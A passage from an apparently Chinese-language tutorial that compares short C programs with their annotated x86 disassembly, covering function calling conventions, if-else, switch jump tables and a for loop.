汇编语言.0070D3F7 ;printf函数</span><br><span class="line">0071381C 83C4 08 ADD ESP,0x8 ;平衡堆栈</span><br><span class="line">0071381F 33C0 XOR EAX,EAX ; eax清零</span><br><span class="line">00713821 5F POP EDI ;回复寄存器</span><br><span class="line">00713822 5E POP ESI</span><br><span class="line">00713823 5B POP EBX</span><br><span class="line">00713824 81C4 CC000000 ADD ESP,0xCC ；释放堆栈</span><br><span class="line">0071382A 3BEC CMP EBP,ESP ;检查堆栈是否平衡</span><br><span class="line">0071382C E8 13B8FFFF CALL 汇编语言.0070F044 ;检查堆栈函数</span><br><span class="line">00713831 8BE5 MOV ESP,EBP ;回复栈</span><br><span class="line">00713833 5D POP EBP ;回复旧EBP</span><br><span class="line">00713834 C3 RETN ;返回</span><br><span class="line">MAX函数-------------------------------------------</span><br><span class="line">00901720 55 PUSH EBP</span><br><span class="line">00901721 8BEC MOV EBP,ESP</span><br><span class="line">00901723 83EC 40 SUB ESP,0x40</span><br><span class="line">00901726 53 PUSH EBX</span><br><span class="line">00901727 56 PUSH ESI</span><br><span class="line">00901728 57 PUSH EDI</span><br><span class="line">00901729 B9 03C09000 MOV ECX,汇编语言.0090C003</span><br><span class="line">0090172E E8 E9FAFFFF CALL 汇编语言.0090121C</span><br><span class="line">00901733 8B45 08 MOV EAX,DWORD PTR SS:[EBP+0x8] ;[EBP+0x8] 参数1 (10)</span><br><span class="line">00901736 3B45 0C CMP EAX,DWORD PTR SS:[EBP+0xC] ; 比较参数1和参数2 [EBP+0xC] 参</span><br><span class="line">数2 (20)</span><br><span class="line">00901739 7E 07 JLE SHORT 汇编语言.00901742 ;小于等于 跳转</span><br><span class="line">0090173B 8B45 08 MOV EAX,DWORD PTR SS:[EBP+0x8] ;返回参数1</span><br><span class="line">0090173E EB 05 JMP SHORT 汇编语言.00901745 ;跳转返回</span><br><span class="line">00901740 EB 03 JMP SHORT 汇编语言.00901745</span><br><span class="line">00901742 8B45 0C MOV EAX,DWORD PTR SS:[EBP+0xC] ;返回参数2</span><br><span class="line">00901745 5F POP EDI ; 回复寄存器</span><br><span class="line">00901746 5E POP ESI</span><br><span class="line">00901747 5B POP EBX</span><br><span class="line">00901748 8BE5 MOV ESP,EBP ;释放栈空间</span><br><span class="line">0090174A 5D POP EBP</span><br><span class="line">0090174B C3 RETN</span><br></pre></td></tr></table></figure><h1 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h1><table><thead><tr><th>约定</th><th>参数传递的方式</th><th>清理栈的方式</th><th>特点</th></tr></thead><tbody><tr><td>_cdecl</td><td>由右向左</td><td>调用者清理</td><td></td></tr><tr><td>_stdcall</td><td>由右向左</td><td>被调用者清理</td><td></td></tr><tr><td>_fastcall</td><td>由右向左</td><td>被调用者清理</td><td>左边开始的两个不大于4字节的参数分别放在ecx和edx寄存器，其余参数自由向左压栈传送</td></tr><tr><td>_thiscall</td><td>由右向左</td><td>被调用清理</td><td>通过ecx传递指针</td></tr></tbody></table><h2 id="C代码演示"><a href="#C代码演示" class="headerlink" title="C代码演示"></a>C代码演示</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// cdecl调用约定</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> _cdecl <span class="title">max1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//stdcall调用约定</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> _stdcall <span class="title">max2</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//_fastcall调用约定</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> _fastcall <span class="title">max3</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b+c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// _thiscall调用约定</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OBJECT</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max4</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// cdecl 调用约定</span></span><br><span class="line">max1(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">max2(<span class="number">20</span>, <span class="number">30</span>);</span><br><span class="line">max3(<span class="number">40</span>, <span class="number">50</span>,<span class="number">60</span>);</span><br><span class="line">OBJECT obj;</span><br><span class="line">obj.max4(<span class="number">70</span>, <span class="number">80</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cdecl调用约定"><a href="#cdecl调用约定" class="headerlink" title="cdecl调用约定"></a>cdecl调用约定</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">max1(10, 20);</span><br><span class="line">; 参数从右往左依次入栈 ，调用者平衡堆栈</span><br><span class="line">00E718E2 6A 14 push 14h</span><br><span class="line">00E718E4 6A 0A push 0Ah</span><br><span class="line">00E718E6 E8 59 F9 FF FF call 00E71244</span><br><span class="line">00E718EB 83 C4 08 add esp,8</span><br></pre></td></tr></table></figure><h2 id="stdcall调用约定"><a href="#stdcall调用约定" class="headerlink" title="stdcall调用约定"></a>stdcall调用约定</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">max2(20, 30);</span><br><span class="line">; 参数从右往左依次入栈</span><br><span class="line">00E718EE 6A 1E push 1Eh</span><br><span class="line">00E718F0 6A 14 push 14h</span><br><span class="line">00E718F2 E8 D6 F7 FF FF call 00E710CD</span><br><span class="line">;被调用者平衡堆栈</span><br><span class="line">00E717AE 8B E5 mov esp,ebp</span><br><span class="line">00E717B0 5D pop ebp</span><br><span class="line">00E717B1 C2 08 00 ret 8</span><br></pre></td></tr></table></figure><h2 id="fastcall调用约定"><a href="#fastcall调用约定" class="headerlink" title="fastcall调用约定"></a>fastcall调用约定</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">max3(40, 50,60);</span><br><span class="line">; 参数从右往左依次入栈,前两个参数由ecx,edx传递</span><br><span class="line">00E718F7 6A 3C push 3Ch</span><br><span class="line">00E718F9 BA 32 00 00 00 mov edx,32h</span><br><span class="line">00E718FE B9 28 00 00 00 mov ecx,28h</span><br><span class="line">00E71903 E8 A2 F7 FF FF call 00E710AA</span><br><span class="line">;被调用者平衡堆栈</span><br><span class="line">00E71819 8B E5 mov esp,ebp</span><br><span class="line">00E7181B 5D pop ebp</span><br><span class="line">00E7181C C2 04 00 ret 4</span><br></pre></td></tr></table></figure><h2 id="thiscall调用约定"><a href="#thiscall调用约定" class="headerlink" title="thiscall调用约定"></a>thiscall调用约定</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OBJECT obj;</span><br><span class="line">obj.max4(70, 80);</span><br><span class="line">; 参数从右往左依次入栈,ecx传递this指针</span><br><span class="line">00E71908 6A 50 push 50h</span><br><span class="line">00E7190A 6A 46 push 46h</span><br><span class="line">00E7190C 8D 4D F7 lea ecx,[ebp-9]</span><br><span class="line">00E7190F E8 44 F9 FF FF call 00E71258</span><br><span class="line">;被调用者平衡堆栈</span><br><span class="line">00E71883 8B E5 mov esp,ebp</span><br><span class="line">00E71885 5D pop ebp</span><br><span class="line">00E71886 C2 08 00 ret 8</span><br></pre></td></tr></table></figure><h1 id="三大结构"><a href="#三大结构" class="headerlink" title="三大结构"></a>三大结构</h1><h2 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h2><p>请忽略…</p><h2 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h3><p>C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a &gt; 5 \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a &lt;= 5 \n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">00731810 55 push ebp</span><br><span class="line">00731811 8B EC mov ebp,esp</span><br><span class="line">00731813 81 EC CC 00 00 00 sub esp,0CCh</span><br><span class="line">00731819 53 push ebx</span><br><span class="line">0073181A 56 push esi</span><br><span class="line">0073181B 57 push edi</span><br><span class="line">0073181C 8D BD 34 FF FF FF lea edi,[ebp+FFFFFF34h]</span><br><span class="line">00731822 B9 33 00 00 00 mov ecx,33h</span><br><span class="line">00731827 B8 CC CC CC CC mov eax,0CCCCCCCCh</span><br><span class="line">0073182C F3 AB rep stos dword ptr es:[edi]</span><br><span class="line">0073182E B9 03 C0 73 00 mov ecx,73C003h</span><br><span class="line">00731833 E8 DF F9 FF FF call 00731217</span><br><span class="line">00731838 C7 45 F8 0A 00 00 00 mov dword ptr [ebp-8],0Ah ；int a</span><br><span class="line">0073183F 83 7D F8 05 cmp dword ptr [ebp-8],5 ; a &gt; 5</span><br><span class="line">00731843 7E 0F jle 00731854 ;如果小于跳转</span><br><span class="line">;a&gt;5 大于执行下面代码</span><br><span class="line">00731845 68 30 7B 73 00 push 737B30h ;&quot;a &gt; 5&quot;</span><br><span class="line">0073184A E8 F7 F7 FF FF call 00731046</span><br><span class="line">0073184F 83 C4 04 add esp,4</span><br><span class="line">00731852 EB 0D jmp 00731861</span><br><span class="line">;a &lt;&#x3D;5 小于执行下面代码</span><br><span class="line">00731854 68 3C 7B 73 00 push 737B3Ch ;&quot;a &lt;&#x3D;5 &quot;</span><br><span class="line">00731859 E8 E8 F7 FF FF call 00731046 ;printf</span><br><span class="line">0073185E 83 C4 04 add esp,4</span><br><span class="line">00731861 33 C0 xor eax,eax ;返回值 0</span><br><span class="line">00731863 5F pop edi</span><br><span class="line">00731864 5E pop esi</span><br><span class="line">00731865 5B pop ebx</span><br><span class="line">00731866 81 C4 CC 00 00 00 add esp,0CCh</span><br><span class="line">0073186C 3B EC cmp ebp,esp</span><br><span class="line">0073186E E8 AE F9 FF FF call 00731221</span><br><span class="line">00731873 8B E5 mov esp,ebp</span><br><span class="line">00731875 5D pop ebp</span><br><span class="line">00731876 C3 ret</span><br></pre></td></tr></table></figure><h3 id="switch-case-1"><a href="#switch-case-1" class="headerlink" title="switch case 1"></a>switch case 1</h3><p>C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">switch</span> (a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">a = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">a = <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">a = <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">00801700 55 push ebp</span><br><span class="line">00801701 8B EC mov ebp,esp</span><br><span class="line">00801703 81 EC D0 00 00 00 sub esp,0D0h</span><br><span class="line">00801709 53 push ebx</span><br><span class="line">0080170A 56 push esi</span><br><span class="line">0080170B 57 push edi</span><br><span class="line">0080170C 8D BD 30 FF FF FF lea edi,[ebp+FFFFFF30h]</span><br><span class="line">00801712 B9 34 00 00 00 mov ecx,34h</span><br><span class="line">00801717 B8 CC CC CC CC mov eax,0CCCCCCCCh</span><br><span class="line">0080171C F3 AB rep stos dword ptr es:[edi]</span><br><span class="line">0080171E B9 03 C0 80 00 mov ecx,80C003h</span><br><span class="line">00801723 E8 E0 FA FF FF call 00801208</span><br><span class="line">00801728 C7 45 F8 04 00 00 00 mov dword ptr [ebp-8],4 ; int a &#x3D;4</span><br><span class="line">0080172F 8B 45 F8 mov eax,dword ptr [ebp-8] ; eax保存4</span><br><span class="line">00801732 89 85 30 FF FF FF mov dword ptr [ebp+FFFFFF30h],eax ;定义局部变量保存a</span><br><span class="line">00801738 83 BD 30 FF FF FF 01 cmp dword ptr [ebp+FFFFFF30h],1 ;比较case 1</span><br><span class="line">0080173F 74 14 je 00801755</span><br><span class="line">00801741 83 BD 30 FF FF FF 02 cmp dword ptr [ebp+FFFFFF30h],2 ;比较case 2</span><br><span class="line">00801748 74 14 je 0080175E</span><br><span class="line">0080174A 83 BD 30 FF FF FF 03 cmp dword ptr [ebp+FFFFFF30h],3 ;比较case 3</span><br><span class="line">00801751 74 14 je 00801767</span><br><span class="line">00801753 EB 1B jmp 00801770 ; 跳转到default</span><br><span class="line">; case1:</span><br><span class="line">00801755 C7 45 F8 01 00 00 00 mov dword ptr [ebp-8],1</span><br><span class="line">0080175C EB 19 jmp 00801777</span><br><span class="line">;case 2:</span><br><span class="line">0080175E C7 45 F8 02 00 00 00 mov dword ptr [ebp-8],2</span><br><span class="line">00801765 EB 10 jmp 00801777</span><br><span class="line">; case 3:</span><br><span class="line">00801767 C7 45 F8 03 00 00 00 mov dword ptr [ebp-8],3</span><br><span class="line">0080176E EB 07 jmp 00801777</span><br><span class="line">switch 2</span><br><span class="line">; default:</span><br><span class="line">00801770 C7 45 F8 00 00 00 00 mov dword ptr [ebp-8],0</span><br><span class="line">00801777 33 C0 xor eax,eax</span><br><span class="line">00801779 5F pop edi</span><br><span class="line">0080177A 5E pop esi</span><br><span class="line">0080177B 5B pop ebx</span><br><span class="line">0080177C 81 C4 D0 00 00 00 add esp,0D0h</span><br><span class="line">00801782 3B EC cmp ebp,esp</span><br><span class="line">00801784 E8 89 FA FF FF call 00801212</span><br><span class="line">00801789 8B E5 mov esp,ebp</span><br><span class="line">0080178B 5D pop ebp</span><br><span class="line">0080178C C3 ret</span><br></pre></td></tr></table></figure><h3 id="switch-case-2"><a href="#switch-case-2" class="headerlink" title="switch case 2"></a>switch case 2</h3><p>C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">switch</span> (a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">a = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">a = <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">a = <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">a = <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">a = <span class="number">3</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">00731700 55 push ebp</span><br><span class="line">00731701 8B EC mov ebp,esp</span><br><span class="line">00731703 81 EC D0 00 00 00 sub esp,0D0h</span><br><span class="line">00731709 53 push ebx</span><br><span class="line">0073170A 56 push esi</span><br><span class="line">0073170B 57 push edi</span><br><span class="line">0073170C 8D BD 30 FF FF FF lea edi,[ebp+FFFFFF30h]</span><br><span class="line">00731712 B9 34 00 00 00 mov ecx,34h</span><br><span class="line">00731717 B8 CC CC CC CC mov eax,0CCCCCCCCh</span><br><span class="line">0073171C F3 AB rep stos dword ptr es:[edi]</span><br><span class="line">0073171E B9 03 C0 73 00 mov ecx,73C003h</span><br><span class="line">00731723 E8 E0 FA FF FF call 00731208</span><br><span class="line">00731728 C7 45 F8 04 00 00 00 mov dword ptr [ebp-8],4 ; int a&#x3D; 4</span><br><span class="line">0073172F 8B 45 F8 mov eax,dword ptr [ebp-8]</span><br><span class="line">00731732 89 85 30 FF FF FF mov dword ptr [ebp+FFFFFF30h],eax ; int i &#x3D; a</span><br><span class="line">00731738 8B 8D 30 FF FF FF mov ecx,dword ptr [ebp+FFFFFF30h] ; i -&#x3D;1</span><br><span class="line">0073173E 83 E9 01 sub ecx,1</span><br><span class="line">00731741 89 8D 30 FF FF FF mov dword ptr [ebp+FFFFFF30h],ecx</span><br><span class="line">;判断 i &gt; 4 跳转到default</span><br><span class="line">00731747 83 BD 30 FF FF FF 04 cmp dword ptr [ebp+FFFFFF30h],4</span><br><span class="line">0073174E 77 3A ja 0073178A</span><br><span class="line">; 跳转表</span><br><span class="line">;0x007317A8 0073175d ].s.</span><br><span class="line">;0x007317AC 00731766 f.s.</span><br><span class="line">;0x007317B0 0073176f o.s.</span><br><span class="line">;0x007317B4 00731778 x.s.</span><br><span class="line">;0x007317B8 00731781 ?.s.</span><br><span class="line">;0x007317BC cccccccc ????</span><br><span class="line">;如果小于4那么</span><br><span class="line">00731750 8B 95 30 FF FF FF mov edx,dword ptr [ebp+FFFFFF30h]</span><br><span class="line">00731756 FF 24 95 A8 17 73 00 jmp dword ptr [edx*4+007317A8h]</span><br><span class="line">$LN4:</span><br><span class="line">0073175D C7 45 F8 01 00 00 00 mov dword ptr [ebp-8],1</span><br><span class="line">00731764 EB 2B jmp 00731791</span><br><span class="line">$LN5:</span><br><span class="line">00731766 C7 45 F8 02 00 00 00 mov dword ptr [ebp-8],2</span><br><span class="line">0073176D EB 22 jmp 00731791</span><br><span class="line">$LN6:</span><br><span class="line">0073176F C7 45 F8 03 00 00 00 mov dword ptr [ebp-8],3</span><br><span class="line">00731776 EB 19 jmp 00731791</span><br><span class="line">$LN7:</span><br><span class="line">00731778 C7 45 F8 03 00 00 00 mov dword ptr [ebp-8],3</span><br><span class="line">0073177F EB 10 jmp 00731791</span><br><span class="line">$LN8:</span><br><span class="line">00731781 C7 45 F8 03 00 00 00 mov dword ptr [ebp-8],3</span><br><span class="line">00731788 EB 07 jmp 00731791</span><br><span class="line">; defalut</span><br><span class="line">0073178A C7 45 F8 00 00 00 00 mov dword ptr [ebp-8],0</span><br><span class="line">00731791 33 C0 xor eax,eax</span><br><span class="line">00731793 5F pop edi</span><br><span class="line">00731794 5E pop esi</span><br><span class="line">00731795 5B pop ebx</span><br><span class="line">00731796 81 C4 D0 00 00 00 add esp,0D0h</span><br><span class="line">0073179C 3B EC cmp ebp,esp</span><br><span class="line">0073179E E8 6F FA FF FF call 00731212</span><br><span class="line">007317A3 8B E5 mov esp,ebp</span><br><span class="line">007317A5 5D pop ebp</span><br><span class="line">007317A6 C3 ret</span><br></pre></td></tr></table></figure><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">00EE1810 55 push ebp</span><br><span class="line">00EE1811 8B EC mov ebp,esp</span><br><span class="line">00EE1813 81 EC D8 00 00 00 sub esp,0D8h</span><br><span class="line">00EE1819 53 push ebx</span><br><span class="line">00EE181A 56 push esi</span><br><span class="line">00EE181B 57 push edi</span><br><span class="line">00EE181C 8D BD 28 FF FF FF lea edi,[ebp+FFFFFF28h]</span><br><span class="line">00EE1822 B9 36 00 00 00 mov ecx,36h</span><br><span class="line">00EE1827 B8 CC CC CC CC mov eax,0CCCCCCCCh</span><br><span class="line">00EE182C F3 AB rep stos dword ptr es:[edi]</span><br><span class="line">00EE182E B9 03 C0 EE 00 mov ecx,0EEC003h</span><br><span class="line">00EE1833 E8 DF F9 FF FF call 00EE1217</span><br><span class="line">&#x2F;&#x2F; for</span><br><span class="line">for (int i &#x3D; 0; i &lt; 10; i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d&quot;, i);</span><br><span class="line">&#125;</span><br><span class="line">; for 循环语句</span><br><span class="line">00EE1838 C7 45 F8 00 00 00 00 mov dword ptr [ebp-8],0 ; int i &#x3D;0;</span><br><span class="line">00EE183F EB 09 jmp 00EE184A</span><br><span class="line">；循环计数 i++</span><br><span class="line">00EE1841 8B 45 F8 mov eax,dword ptr [ebp-8]</span><br><span class="line">00EE1844 83 C0 01 add eax,1</span><br><span class="line">00EE1847 89 45 F8 mov dword ptr [ebp-8],eax</span><br><span class="line">00EE184A 83 7D F8 0A cmp dword ptr [ebp-8],0Ah ；if i &gt;&#x3D;10 循环结束</span><br><span class="line">00EE184E 7D 13 jge 00EE1863</span><br><span class="line">； 循环体</span><br><span class="line">00EE1850 8B 45 F8 mov eax,dword ptr [ebp-8]</span><br><span class="line">00EE1853 50 push eax 